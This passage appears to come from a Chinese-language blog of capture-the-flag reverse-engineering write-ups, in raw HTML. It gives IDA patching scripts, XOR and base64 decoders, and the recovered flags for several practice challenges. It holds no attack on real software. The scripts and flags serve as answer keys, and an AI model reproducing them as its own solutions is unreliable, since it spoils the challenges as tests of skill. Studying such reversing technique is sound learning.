class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5Mc58bPHLiAx7J8ocJIlaVUxaJvMcoYMaoPMaOfg15c475tscHfM/8==</span><br><span class=\"line\">qvEJAfHmUYjBac+u8Ph5n9Od17FrICL/X0gVtM4Qk6T2z3wNSsyoebilxWKGZpRD</span><br><span class=\"line\">please input the flag:</span><br><span class=\"line\">failed!</span><br><span class=\"line\">success!</span><br></pre></td></tr></table></figure></p>\n<p>判断</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5Mc58bPHLiAx7J8ocJIlaVUxaJvMcoYMaoPMaOfg15c475tscHfM/8==</span><br></pre></td></tr></table></figure></p>\n<p>为 base64</p>\n<p>然后</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">qvEJAfHmUYjBac+u8Ph5n9Od17FrICL/X0gVtM4Qk6T2z3wNSsyoebilxWKGZpRD</span><br></pre></td></tr></table></figure></p>\n<p>这个应该就是码表了</p>\n<p>放进 CyberChef 试试</p>\n<p>就得到 flag</p>\n<h4 id=\"gfctf-2021wordy\"><a class=\"anchor\" href=\"#gfctf-2021wordy\">#</a> [GFCTF 2021]wordy</h4>\n<p>打开后找不到 strings 找不到</p>\n<p>IDA 打开存在大量 jmp 跳转，导致程序无法正常编译，尝试将跳转 nop 掉</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">startaddr = 0x1135</span><br><span class=\"line\">endaddr = 0x3100</span><br><span class=\"line\"></span><br><span class=\"line\">for i in range(startaddr,endaddr):</span><br><span class=\"line\">    if get_wide_byte(i) == 0xEB:</span><br><span class=\"line\">        if get_wide_byte(i+1) == 0xFF:</span><br><span class=\"line\">            patch_byte(i,0x90)</span><br><span class=\"line\">            print(&quot;[+] Addr &#123;&#125; is patched&quot;.format(hex(i)))</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">t:0000000000002D59                 mov     edi, 47h ; &#x27;G&#x27;</span><br><span class=\"line\">.text:0000000000002D5E                 call    _putchar</span><br><span class=\"line\">.text:0000000000002D63                 nop</span><br><span class=\"line\">.text:0000000000002D64                 inc     eax</span><br><span class=\"line\">.text:0000000000002D66                 mov     edi, 46h ; &#x27;F&#x27;</span><br><span class=\"line\">.text:0000000000002D6B                 call    _putchar</span><br><span class=\"line\">.text:0000000000002D70                 nop</span><br><span class=\"line\">.text:0000000000002D71                 inc     eax</span><br><span class=\"line\">.text:0000000000002D73                 mov     edi, 43h ; &#x27;C&#x27;</span><br><span class=\"line\">.text:0000000000002D78                 call    _putchar</span><br><span class=\"line\">.text:0000000000002D7D                 nop</span><br><span class=\"line\">.text:0000000000002D7E                 inc     eax</span><br><span class=\"line\">.text:0000000000002D80                 mov     edi, 54h ; &#x27;T&#x27;</span><br><span class=\"line\">.text:0000000000002D85                 call    _putchar</span><br><span class=\"line\">.text:0000000000002D8A                 nop</span><br><span class=\"line\">.text:0000000000002D8B                 inc     eax</span><br><span class=\"line\">.text:0000000000002D8D                 mov     edi, 46h ; &#x27;F&#x27;</span><br><span class=\"line\">.text:0000000000002D92                 call    _putchar</span><br><span class=\"line\">.text:0000000000002D97                 nop</span><br><span class=\"line\">.text:0000000000002D98                 inc     eax</span><br><span class=\"line\">.text:0000000000002D9A                 mov     edi, 7Bh ; &#x27;&#123;&#x27;</span><br><span class=\"line\">.text:0000000000002D9F                 call    _putchar</span><br><span class=\"line\">.text:0000000000002DA4                 nop</span><br><span class=\"line\">.text:0000000000002DA5                 inc     eax</span><br><span class=\"line\">.text:0000000000002DA7                 mov     edi, 75h ; &#x27;u&#x27;</span><br><span class=\"line\">.text:0000000000002DAC                 call    _putchar</span><br><span class=\"line\">.text:0000000000002DB1                 nop</span><br><span class=\"line\">.text:0000000000002DB2                 inc     eax</span><br><span class=\"line\">.text:0000000000002DB4                 mov     edi, 5Fh ; &#x27;_&#x27;</span><br><span class=\"line\">.text:0000000000002DB9                 call    _putchar</span><br><span class=\"line\">.text:0000000000002DBE                 nop</span><br><span class=\"line\">.text:0000000000002DBF                 inc     eax</span><br><span class=\"line\">.text:0000000000002DC1                 mov     edi, 61h ; &#x27;a&#x27;</span><br><span class=\"line\">.text:0000000000002DC6                 call    _putchar</span><br><span class=\"line\">.text:0000000000002DCB                 nop</span><br><span class=\"line\">.text:0000000000002DCC                 inc     eax</span><br><span class=\"line\">.text:0000000000002DCE                 mov     edi, 72h ; &#x27;r&#x27;</span><br><span class=\"line\">.text:0000000000002DD3                 call    _putchar</span><br><span class=\"line\">.text:0000000000002DD8                 nop</span><br><span class=\"line\">.text:0000000000002DD9                 inc     eax</span><br><span class=\"line\">.text:0000000000002DDB                 mov     edi, 65h ; &#x27;e&#x27;</span><br><span class=\"line\">.text:0000000000002DE0                 call    _putchar</span><br><span class=\"line\">.text:0000000000002DE5                 nop</span><br><span class=\"line\">.text:0000000000002DE6                 inc     eax</span><br><span class=\"line\">.text:0000000000002DE8                 mov     edi, 32h ; &#x27;2&#x27;</span><br><span class=\"line\">.text:0000000000002DED                 call    _putchar</span><br><span class=\"line\">.text:0000000000002DF2                 nop</span><br><span class=\"line\">.text:0000000000002DF3                 inc     eax</span><br><span class=\"line\">.text:0000000000002DF5                 mov     edi, 77h ; &#x27;w&#x27;</span><br><span class=\"line\">.text:0000000000002DFA                 call    _putchar</span><br><span class=\"line\">.text:0000000000002DFF                 nop</span><br><span class=\"line\">.text:0000000000002E00                 inc     eax</span><br><span class=\"line\">.text:0000000000002E02                 mov     edi, 6Fh ; &#x27;o&#x27;</span><br><span class=\"line\">.text:0000000000002E07                 call    _putchar</span><br><span class=\"line\">.text:0000000000002E0C                 nop</span><br><span class=\"line\">.text:0000000000002E0D                 inc     eax</span><br><span class=\"line\">.text:0000000000002E0F                 mov     edi, 72h ; &#x27;r&#x27;</span><br><span class=\"line\">.text:0000000000002E14                 call    _putchar</span><br><span class=\"line\">.text:0000000000002E19                 nop</span><br><span class=\"line\">.text:0000000000002E1A                 inc     eax</span><br><span class=\"line\">.text:0000000000002E1C                 mov     edi, 64h ; &#x27;d&#x27;</span><br><span class=\"line\">.text:0000000000002E21                 call    _putchar</span><br><span class=\"line\">.text:0000000000002E26                 nop</span><br><span class=\"line\">.text:0000000000002E27                 inc     eax</span><br><span class=\"line\">.text:0000000000002E29                 mov     edi, 79h ; &#x27;y&#x27;</span><br><span class=\"line\">.text:0000000000002E2E                 call    _putchar</span><br><span class=\"line\">.text:0000000000002E33                 nop</span><br><span class=\"line\">.text:0000000000002E34                 inc     eax</span><br><span class=\"line\">.text:0000000000002E36                 mov     edi, 7Dh ; &#x27;&#125;&#x27;</span><br><span class=\"line\">.text:0000000000002E3B                 call    _putchar</span><br></pre></td></tr></table></figure></p>\n<p>并且这个 hexview 也能看到 flag</p>\n<p>或者简洁一点</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">startaddr=0x1135</span><br><span class=\"line\">endaddr=0x3100</span><br><span class=\"line\">for i in range(startaddr,endaddr):</span><br><span class=\"line\">    if get_wide_byte(i)==0xC0:</span><br><span class=\"line\">        print(chr(idaapi.get_byte(i+2)),end=&quot;&quot;)</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"swpuctf-2021-新生赛fakerandom\"><a class=\"anchor\" href=\"#swpuctf-2021-新生赛fakerandom\">#</a> [SWPUCTF 2021 新生赛] fakerandom</h4>\n<p>这个题的话经过调试即可得到</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import random</span><br><span class=\"line\">flag = [201, 8, 198, 68, 131, 152, 186, 136, 13, 130, 190, 112, 251, 93, 212, 1, 31, 214, 116, 244]</span><br><span class=\"line\">random.seed(1)</span><br><span class=\"line\">l = []</span><br><span class=\"line\">for i in range(4):</span><br><span class=\"line\">    l.append(random.getrandbits(8))</span><br><span class=\"line\">print(l)</span><br><span class=\"line\">flag1=&#x27;&#x27;</span><br><span class=\"line\">result=[]</span><br><span class=\"line\">for i in range(len(l)):</span><br><span class=\"line\">    random.seed(l[i])</span><br><span class=\"line\">    for n in range(5):</span><br><span class=\"line\">        result=flag[i*5+n]^random.getrandbits(8)</span><br><span class=\"line\">        print(result)</span><br><span class=\"line\">        flag1+=chr(result)</span><br><span class=\"line\">print(flag1)</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"swpuctf-2022-新生赛base64\"><a class=\"anchor\" href=\"#swpuctf-2022-新生赛base64\">#</a> [SWPUCTF 2022 新生赛] base64</h4>\n<p>这个题的话 strings 进行查看</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[]A\\A]A^A_</span><br><span class=\"line\">TlNTQ1RGe2Jhc2VfNjRfTlRXUTRaR0ROQzdOfQ==</span><br><span class=\"line\">This is flag!!</span><br><span class=\"line\">This is wrong</span><br><span class=\"line\">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</span><br><span class=\"line\">:*3$&quot;</span><br><span class=\"line\">GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0</span><br></pre></td></tr></table></figure></p>\n<p>base64 换码表即可得到 flag</p>\n<h4 id=\"nisactf-2022string\"><a class=\"anchor\" href=\"#nisactf-2022string\">#</a> [NISACTF 2022]string</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;stdio.h&gt;  </span><br><span class=\"line\">#include &lt;string.h&gt;  </span><br><span class=\"line\">#include &lt;stdlib.h&gt;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123; </span><br><span class=\"line\">  int m;</span><br><span class=\"line\">  int v4;</span><br><span class=\"line\">  int seed=0x2766;</span><br><span class=\"line\"></span><br><span class=\"line\">  srand(seed);</span><br><span class=\"line\">  printf(&quot;NSSCTF&#123;&quot;);</span><br><span class=\"line\">  for ( m = 0; m &lt; 13; ++m )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v4 = rand();</span><br><span class=\"line\">    printf(&quot;%d&quot;, (unsigned int)(v4 % 8 + 1));</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  putchar(125);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"hdctf-2023easy_re\"><a class=\"anchor\" href=\"#hdctf-2023easy_re\">#</a> [HDCTF 2023]easy_re</h4>\n<p>使用 upx -d 进行脱壳然后在利用 ida64 来查看 base64 加密后的信息，在 base64 解密得到 flag</p>\n<h4 id=\"nssround3-teamjump_by_jump\"><a class=\"anchor\" href=\"#nssround3-teamjump_by_jump\">#</a> [NSSRound#3 Team]jump_by_jump</h4>\n<p>使用 strings 直接查看到 flag</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">└─$ strings jump_by_jump.exe |grep CTF</span><br><span class=\"line\">NSSCTF&#123;Jump_b9_jump!&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"nisactf-2022sign-ezc\"><a class=\"anchor\" href=\"#nisactf-2022sign-ezc\">#</a> [NISACTF 2022]sign-ezc++</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void __cdecl Human::give_flag(Human *const this)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  int i; // [rsp+2Ch] [rbp-54h]</span><br><span class=\"line\"></span><br><span class=\"line\">  for ( i = 0; i &lt; strlen(flag); ++i )</span><br><span class=\"line\">    flag[i] ^= 0xAu;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; d=[0x44, 0x59, 0x59, 0x49, 0x5E, 0x4C, 0x71, 0x7E, 0x62, 0x63,</span><br><span class=\"line\">...   0x79, 0x55, 0x63, 0x79, 0x55, 0x44, 0x43, 0x59, 0x4B, 0x55,</span><br><span class=\"line\">...   0x78, 0x6F, 0x55, 0x79, 0x63, 0x6D, 0x64, 0x77, 0x00, 0x00,</span><br><span class=\"line\">...   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class=\"line\">...   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]</span><br><span class=\"line\">&gt;&gt;&gt; for i in d:</span><br><span class=\"line\">...  print(chr(i^0xa),end=&quot;&quot;)</span><br><span class=\"line\">...</span><br><span class=\"line\">NSSCTF&#123;this_is_NISA_re_sign&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"hnctf-2022-week1超级签到\"><a class=\"anchor\" href=\"#hnctf-2022-week1超级签到\">#</a> [HNCTF 2022 Week1] 超级签到</h4>\n<p>将 {hello_world} 里面的 o 变成 0 即可</p>\n<h4 id=\"swpuctf-2022-新生赛babyre\"><a class=\"anchor\" href=\"#swpuctf-2022-新生赛babyre\">#</a> [SWPUCTF 2022 新生赛] babyre</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">└─$ strings p01.exe |grep &#125;</span><br><span class=\"line\">The flag is: NSSCTF&#123;this_is_the_first_flag&#125;</span><br><span class=\"line\">      &lt;supportedOS Id=&quot;&#123;e2011457-1546-43c5-a5fe-008deee3d3f0&#125;&quot;/&gt;</span><br><span class=\"line\">      &lt;supportedOS Id=&quot;&#123;35138b9a-5d96-4fbd-8e2d-a2440225f93a&#125;&quot;/&gt;</span><br><span class=\"line\">      &lt;supportedOS Id=&quot;&#123;4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38&#125;&quot;/&gt;</span><br><span class=\"line\">      &lt;supportedOS Id=&quot;&#123;1f676c76-80e1-4239-95bb-83d0f6d0da78&#125;&quot;/&gt;</span><br><span class=\"line\">      &lt;supportedOS Id=&quot;&#123;8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a&#125;&quot;/&gt;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"swpuctf-2022-新生赛easyre\"><a class=\"anchor\" href=\"#swpuctf-2022-新生赛easyre\">#</a> [SWPUCTF 2022 新生赛] easyre</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">└─$ strings p02.exe |grep &#125;</span><br><span class=\"line\">|$X;D$@&#125;</span><br><span class=\"line\">/5&#125;A</span><br><span class=\"line\">NSSCTF&#123;oh_you_find_it&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"utctf-2020basicsre\"><a class=\"anchor\" href=\"#utctf-2020basicsre\">#</a> [UTCTF 2020]Basics(RE)</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">└─$ strings calc|grep &#125;</span><br><span class=\"line\">utflag&#123;str1ngs_1s_y0ur_fr13nd&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"hnctf-2022-week2esy_flower\"><a class=\"anchor\" href=\"#hnctf-2022-week2esy_flower\">#</a> [HNCTF 2022 WEEK2]e@sy_flower</h4>\n<p>进入 ida 然后发现有报错，需要先把那个报错改一下把 e9 变成 90 也就是 nop 然后按 p 编译后得到 main 函数 f5 查看伪代码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sub_401020(&quot;please input flag\\n&quot;, v8);</span><br><span class=\"line\">  sub_401050(&quot;%s&quot;, (char)Arglist);</span><br><span class=\"line\">  v3 = strlen(Arglist);</span><br><span class=\"line\">  for ( i = 0; i &lt; v3 / 2; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v5 = Arglist[2 * i];</span><br><span class=\"line\">    Arglist[2 * i] = Arglist[2 * i + 1];</span><br><span class=\"line\">    Arglist[2 * i + 1] = v5;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  for ( j = 0; j &lt; strlen(Arglist); ++j )</span><br><span class=\"line\">    Arglist[j] ^= 0x30u;</span><br><span class=\"line\">  v7 = strcmp(Arglist, &quot;c~scvdzKCEoDEZ[^roDICUMC&quot;);</span><br><span class=\"line\">  if ( v7 )</span><br><span class=\"line\">    v7 = v7 &lt; 0 ? -1 : 1;</span><br><span class=\"line\">  if ( !v7 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    sub_401020(&quot;yes&quot;, v9);</span><br><span class=\"line\">    exit(0);</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure></p>\n<p>这个相当于 c~scvdzKCEoDEZ [^roDICUMC 的加密过程然后还使用的异或，这种时候我们在使用一次异或就还原回来了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;stdio.h&gt;  </span><br><span class=\"line\">#include &lt;string.h&gt;  </span><br><span class=\"line\">#include &lt;stdlib.h&gt;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123; </span><br><span class=\"line\">  signed int v3; // kr00_4</span><br><span class=\"line\">  int i; // edx</span><br><span class=\"line\">  char v5; // cl</span><br><span class=\"line\">  unsigned int j; // edx</span><br><span class=\"line\">  int v7; // eax</span><br><span class=\"line\">  char v8; // [esp+0h] [ebp-44h]</span><br><span class=\"line\">  char v9; // [esp+0h] [ebp-44h]</span><br><span class=\"line\">  char Arglist[48]; // [esp+10h] [ebp-34h] BYREF</span><br><span class=\"line\"></span><br><span class=\"line\">  scanf(&quot;%s&quot;,Arglist);</span><br><span class=\"line\">  v3 = strlen(Arglist);</span><br><span class=\"line\">  for ( i = 0; i &lt; v3 / 2; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v5 = Arglist[2 * i];</span><br><span class=\"line\">    Arglist[2 * i] = Arglist[2 * i + 1];</span><br><span class=\"line\">    Arglist[2 * i + 1] = v5;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  for ( j = 0; j &lt; strlen(Arglist); ++j )&#123;</span><br><span class=\"line\">    Arglist[j] ^= 0x30u;&#125;</span><br><span class=\"line\">  printf(&quot;%s&quot;,Arglist);</span><br><span class=\"line\">  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>代码逻辑很简单，每两个一组然后进行异或换位如果不足两个就不换</p>\n<p>直接复制粘贴代码本地跑一次即可得到 flag</p>\n<h4 id=\"litctf-2023ez_xor\"><a class=\"anchor\" href=\"#litctf-2023ez_xor\">#</a> [LitCTF 2023]ez_XOR</h4>\n<p>又是一个异或题</p>\n<p>打开后粘贴复制 xor 函数</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;stdio.h&gt;  </span><br><span class=\"line\">#include &lt;string.h&gt;  </span><br><span class=\"line\">#include &lt;stdlib.h&gt;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123; </span><br><span class=\"line\">  size_t result; // eax</span><br><span class=\"line\">  int i; // [esp+2Ch] [ebp-Ch]</span><br><span class=\"line\">  char Str[50];</span><br><span class=\"line\">  int a2;</span><br><span class=\"line\"></span><br><span class=\"line\">  a2=3;</span><br><span class=\"line\">  scanf(&quot;%s&quot;,Str);</span><br><span class=\"line\">  Str[13]=&#x27;0&#x27;;</span><br><span class=\"line\">  for ( i = 0; ; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    result = strlen(Str);</span><br><span class=\"line\">    if ( i &gt;= result )</span><br><span class=\"line\">      break;</span><br><span class=\"line\">    Str[i] ^= 3 * a2;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  printf(&quot;%s&quot;,Str);</span><br><span class=\"line\">  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"swpuctf-2021-新生赛fakebase\"><a class=\"anchor\" href=\"#swpuctf-2021-新生赛fakebase\">#</a> [SWPUCTF 2021 新生赛] fakebase</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s_box = &#x27;qwertyuiopasdfghjkzxcvb123456#$&#x27;</span><br><span class=\"line\">s = &#x27;u#k4ggia61egegzjuqz12jhfspfkay&#x27;</span><br><span class=\"line\">flag=&quot;&quot;</span><br><span class=\"line\">for k in range(5):</span><br><span class=\"line\">\tb1=k</span><br><span class=\"line\">\tfor i in s[::-1]:</span><br><span class=\"line\">\t\tb1 = b1*31+s_box.index(i)</span><br><span class=\"line\">\tt = str(bin(b1)[2:])</span><br><span class=\"line\">\tt = str(t.zfill((len(t) // 8 + 1) * 8))</span><br><span class=\"line\">\tfor i in range(0,len(t),8):</span><br><span class=\"line\">\t\tflag = flag +chr(int(t[i:i+8],2))</span><br><span class=\"line\">\tprint(flag)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"bjdctf-2020justre\"><a class=\"anchor\" href=\"#bjdctf-2020justre\">#</a> [BJDCTF 2020]JustRE</h4>\n<p>很简单 ida 打开就有</p>\n<h4 id=\"nisactf-2022ezpython\"><a class=\"anchor\" href=\"#nisactf-2022ezpython\">#</a> [NISACTF 2022]ezpython</h4>\n<p>这个 ida 打开后看到了 pythonstring 直接使用 uncompyle6 src.pyc &gt;ss.py 来得到源码</p>\n<p>然后修改代码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span 